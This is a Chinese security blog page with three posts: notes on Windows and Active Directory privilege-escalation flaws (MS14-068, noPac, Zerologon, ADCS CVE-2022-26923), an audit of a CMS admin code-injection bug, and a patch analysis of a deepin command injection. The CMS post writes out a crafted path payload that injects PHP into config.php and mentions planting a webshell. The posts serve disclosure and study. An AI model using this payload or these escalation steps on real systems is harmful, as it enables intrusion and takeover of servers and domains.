            <a href="/2024/09/09/windows%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">windows常见提权漏洞总结.md</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-09-10 03:38:24" itemprop="dateCreated datePublished" datetime="2024-09-10T03:38:24+08:00">2024-09-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-13 17:52:44" itemprop="dateModified" datetime="2024-11-13T17:52:44+08:00">2024-11-13</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h2><h4 id="MS14-068；CVE-2014-6324"><a href="#MS14-068；CVE-2014-6324" class="headerlink" title="MS14-068；CVE-2014-6324"></a>MS14-068；CVE-2014-6324</h4><h5 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h5><p>PAC（Privilege Attribute Certificate），特权属性证书。根据用户声明的身份和server端的acl表确定后，在TGT中包含。</p>
<p>PAC包括</p>
<ol>
<li>身份信息</li>
<li>授权信息</li>
<li>签名信息<ol>
<li>PAC签名，默认根据krbtgt_hash签名，并将结果放在tgt中。但微软又允许<strong>客户端指定任意签名算法</strong></li>
<li><strong>服务特定签名（在某些场景下</strong>，忽略。</li>
</ol>
</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://1y0ng.github.io/post/2023/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bms14-068%E5%92%8C%E9%BB%84%E9%87%91%E3%80%81%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/">内网渗透之ms14_068和黄金、白银票据 | 1y0ng’s Blog</a></p>
<p>AS-REQ 设置<code>include-PAC</code>为<code>False</code>,则返回TGT中不会包含PAC。我们可以自己放个PAC，放到TGS-REQ中。<strong>PAC没有被放在TGT中,而是放在了TGS_REQ数据包的其它地方.但可笑的是,KDC在实现上竟然允许这样的构造,也就是说,KDC能够正确解析出没有放在其它地方的PAC信息.</strong></p>
<p><strong>KDC验证缺少PAC的TGT成功后,再验证不在TGT中 的PAC的合法性.如果2个均验证成功,KDC把PAC中的User SID、Group SID取出来,重新使用进行签名,签名算法和密钥与设置inclue-pac标志位为TRUE时一模一样.将将新产生的PAC加入到解密后的TGT中,再重新加密制作全新的TGT发送给Client,不是TGS</strong></p>
<p>这样得到了一个高权限的PAC</p>
<p>和jwt 先validate expire  后verify一样。 </p>
<p>AS-REQ   <code>include-PAC</code>为<code>False</code></p>
<p>AS-RES   返回TGT</p>
<p>TGS-REQ   发送TGT和不在TGT中PAC</p>
<p> TGS-RES  PAC确定身份的TGT、</p>
<h4 id="CVE-2021-42287-CVE-2021-42278"><a href="#CVE-2021-42287-CVE-2021-42278" class="headerlink" title="CVE-2021-42287&#x2F;CVE-2021-42278"></a>CVE-2021-42287&#x2F;CVE-2021-42278</h4><ul>
<li>CVE-2021-42278，机器账户的名称一般用<code>$</code>结尾，但AD并未对域内机器账户名进行验证。</li>
<li>CVE-2021-42287， 结合上述42278漏洞，创建一个与DC机器账户名称相同的机器账户(不以$结尾)，使用该账户请求一个TGT后，修改账户名，然后通过S4U2Self申请TGS Ticket，然后DC进行在<code>TGS_REP</code>阶段加密<code>TGS Ticket</code>时，无法找到该账户利用机器账户hash加密，DC便使用自己的hash加密<code>TGS Ticket</code>，提供一个属于该账户的<code>PAC</code>，我们便可得到一个高权限的ST。</li>
</ul>
<p>约束委派S4U2提权</p>
<h2 id="Zerologon"><a href="#Zerologon" class="headerlink" title="Zerologon"></a>Zerologon</h2><p>号称3秒撸域控</p>
<h4 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h4><p>AES-CFB8安全性取决于随机选择的IV。但在Netlogon RPC中，作为ComputeNetlogonCredential检查的一部分，IV被错误的设置为0。</p>
<p>属于错误配置漏洞，加密算法这块先暂存一下。</p>
<p>流量日志看</p>
<p><img src="/../imgs/$%7Bfiilename%7D/20201007171427-80258148-087d-1.jpg" alt="img"></p>
<p>这个洞打完得恢复下密码。注册表中的密码是不改的。</p>
<h2 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h2><p>ADCS 是一套域内的证书服务，安装了ADCS服务的域内允许通过CA签发的证书进行身份认证。</p>
<h4 id="CVE-2022-26923"><a href="#CVE-2022-26923" class="headerlink" title="CVE-2022-26923"></a>CVE-2022-26923</h4><h5 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h5><p>默认情况下，域用户账号可以申请User证书，域计算机机器账号可以申请Machine证书，两个证书都允许客戶端身份验证。用户账号用UPN区分用户，机器账号用dNSHostName来区别机器，服务用SPN来唯一确定一个服务。</p>
<p>微软策略允许不同机器有相同dns名称</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/adschema/r-validated-dns-host-name">https://docs.microsoft.com/en-us/windows/win32/adschema/r-validated-dns-host-name</a></p>
<p>但机器账号身份与SPN有联系。SPN具有唯一性</p>
<p>机器账号存在dNSHostName属性。该属性和机器证书是绑定的，不同机器账号的dNSHostName内容，就会得到不同的证书。选一个可控的机器账号对象，将dNSHostName的值改成域控”dc.test.com”，同时解除该机器账号绑定的SPN，即可获取域控机器账户的权限。</p>
<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><p><strong>1、域控服务器系统版本</strong></p>
<p>Win8.1、Win10、Win11、Win Server 2012 R2、Win Server 2016、Win Server 2019、Win Server 2022等版本，详细版本号可以参考微软官方的公告（参考链接）。</p>
<p><strong>2、域内普通用户账号权限</strong></p>
<p>且用户对自己创立的机器用户的dNSHostName与SPN具有写权限</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/09/%E6%9F%904kstar%20cms%E5%AE%A1%E8%AE%A1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Charger0">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Charger0">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/09/09/%E6%9F%904kstar%20cms%E5%AE%A1%E8%AE%A1/" class="post-title-link" itemprop="url">某4Kstar CMS审计</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-09-10 03:38:24" itemprop="dateCreated datePublished" datetime="2024-09-10T03:38:24+08:00">2024-09-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-13 17:51:46" itemprop="dateModified" datetime="2024-11-13T17:51:46+08:00">2024-11-13</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前置说明"><a href="#前置说明" class="headerlink" title="前置说明"></a>前置说明</h1><p>此漏洞基于CVE-2023-47444&#x2F;CNVD-2024-30067相同的前置条件  即管理员权限且默认存储位置未修改</p>
<p><a target="_blank" rel="noopener" href="https://0xbro.red/disclosures/disclosed-vulnerabilities/opencart-cve-2023-47444/">OpenCart 中经过身份验证的静态代码注入 （CVE-2023-47444） |0xbro</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2024-30067">OpenCart授权问题漏洞（CNVD-2024-30067）(cnvd.org.cn)</a></p>
<p>此漏洞与上述漏洞影响版本不同，究其原因是通过代码审计发现 V3与V4中代码的具体实现不同，V4中</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>创建数据库</p>
<p><img src="/./../imgs/wps19.jpg" alt="img"> </p>
<p>源码复制到WWW目录</p>
<p><img src="/./../imgs/wps20.jpg" alt="img"> </p>
<p>访问index.php 自动跳转到安装  </p>
<p>环境检查通过</p>
<p><img src="/./../imgs/wps21.jpg" alt="img"> </p>
<p>配置数据库连接</p>
<p><img src="/./../imgs/wps22.jpg" alt="img"> </p>
<p>安装成功 删除install目录  </p>
<p>环境搭建完成 开始白盒审计</p>
<h1 id="审计过程"><a href="#审计过程" class="headerlink" title="审计过程"></a>审计过程</h1><p>优先审计后台功能点，根据设置的用户密码登录后台</p>
<p>审计到&#x2F;admin&#x2F;common&#x2F;security&#x2F;move</p>
<p><img src="/./../imgs/wps23.jpg" alt="img"> </p>
<p>用户控制的变量被放置在其中，然后将其写入新文件，而没有适当的转义或验证。</p>
<p>查到这里出现过漏洞 但影响版本均为4.0及其更高版本</p>
<p>对比代码</p>
<p><img src="/./../imgs/wps24.jpg" alt="img"> </p>
<p>可以看出 $base_new 等效$path . $directory</p>
<p>跟踪V4中 $base_new的声明</p>
<p><img src="/./../imgs/wps25.jpg" alt="img"> </p>
<p>可知 V4中  $path . $name 等效V3中 $path . $directory</p>
<p>由V4中 关于  $path . $name  的校验</p>
<p><img src="/./../imgs/wps26.jpg" alt="img"> </p>
<p>与V3中 $path . $directory 对比</p>
<p><img src="/./../imgs/wps27.jpg" alt="img"> </p>
<p>得知V3对 $path参数 过滤不严 </p>
<p>V4对 $name参数 过滤不严 </p>
<p>既然V4的$name存在注入  我们设想V3同样存在注入</p>
<p>实现注入所需字符同V4有 ‘ # ) ; </p>
<p>输入与<a target="_blank" rel="noopener" href="https://0xbro.red/disclosures/disclosed-vulnerabilities/opencart-cve-2023-47444/">OpenCart 中经过身份验证的静态代码注入 （CVE-2023-47444） |0xbro</a> 相同的payload后，进入报错逻辑  </p>
<p><img src="/./../imgs/wps28.jpg" alt="img"> </p>
<p>须进一步修改代码 </p>
<p>由str_replace(‘\‘, ‘&#x2F;‘, substr(<strong>DIR_SYSTEM</strong>, 0, strlen($path))</p>
<p><strong>DIR_SYSTEM &#x3D; ‘D:&#x2F; phpstudy_pro&#x2F; WWW&#x2F; upload&#x2F; system&#x2F;‘: string</strong></p>
<p>可知  $path需要输入的格式为绝对路径  这样substr截取后的才是我们要注入的字符串</p>
<p>需要网站目录绝对路径 可以通过错误日志查看</p>
<p><img src="/./../imgs/wps29.jpg" alt="img"> </p>
<p>更换payload后 </p>
<p><img src="/./../imgs/wps30.jpg" alt="img"> </p>
<p>Realpath报错</p>
<p>查明原因后得知  realpath需要的是真实存在的目录</p>
<p>经过测试</p>
<p>D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;upload&#x2F;system&#x2F;..&#x2F;pwned’);phpinfo();#-&#x2F;..&#x2F;system</p>
<p>这样的相对路径能够使realpath正常运行 同时保留了注入字符</p>
<h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h1><p><img src="/./../imgs/wps31.jpg" alt="img"> </p>
<p><img src="/./../imgs/wps32.jpg" alt="img"> </p>
<p>可以正常进入代码注入逻辑</p>
<p>正常返回</p>
<p><img src="/./../imgs/wps33.jpg" alt="img"> </p>
<p>成功：storage 文件夹位置已更改！</p>
<p>可以看到新产生目录</p>
<p><img src="/./../imgs/wps34.jpg" alt="img"> </p>
<p>而admin&#x2F;config.php注入了phpinfo();</p>
<p><img src="/./../imgs/wps35.jpg" alt="img"> </p>
<p>同样的 我们可以注入一句话木马 </p>
<p><img src="/./../imgs/wps36.jpg" alt="img"> </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/19/%E7%BB%9F%E4%BF%A1UOS%E6%9F%90%E6%9C%8D%E5%8A%A1%E8%BF%9B%E7%A8%8B%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Charger0">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Charger0">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/08/19/%E7%BB%9F%E4%BF%A1UOS%E6%9F%90%E6%9C%8D%E5%8A%A1%E8%BF%9B%E7%A8%8B%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">统信UOS某服务进程本地提权漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-08-20 03:38:24" itemprop="dateCreated datePublished" datetime="2024-08-20T03:38:24+08:00">2024-08-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-13 17:52:20" itemprop="dateModified" datetime="2024-11-13T17:52:20+08:00">2024-11-13</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h3><p>deepin-devicemanager服务器的installDriver接口存在命令注入漏洞，管理员用户输入当前密码后可提升至root权限。</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>github 上diff installDriver接口</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20241111174543825.png" alt="image-20241111174543825"></p>
<p>先看util类的变化。新定义了一个函数Utils::runCmdSafeWithArgs。看代码逻辑，这个函数通过将程序和参数作为单独的参数传递给 QProcess，有效地避免了命令注入风险。</p>
<p>找到使用Utils::runCmdSafeWithArgs的方法，存在两处改进的代码。</p>
<p>代码块一DriverManager::isSigned</p>
<p>升级前代码strSignTool + filepath 这一行将 filepath（文件路径）直接拼接到命令行字符串options中；</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20241111174659510.png" alt="image-20241111174659510"></p>
<p>代码块 二同理。</p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>改进后的代码中，命令和参数被清晰地分开处理。program 保存了要执行的命令，而 arguments 则是命令的参数列表。确保了 filepath&#x2F;strPkgName 只是作为一个参数传递，而不是命令的一部分，即使 filepath&#x2F;strPkgName 中包含恶意字符，也不会被解释为命令的一部分，从而有效防止了命令注入。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Charger0</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">7</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Charger0</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
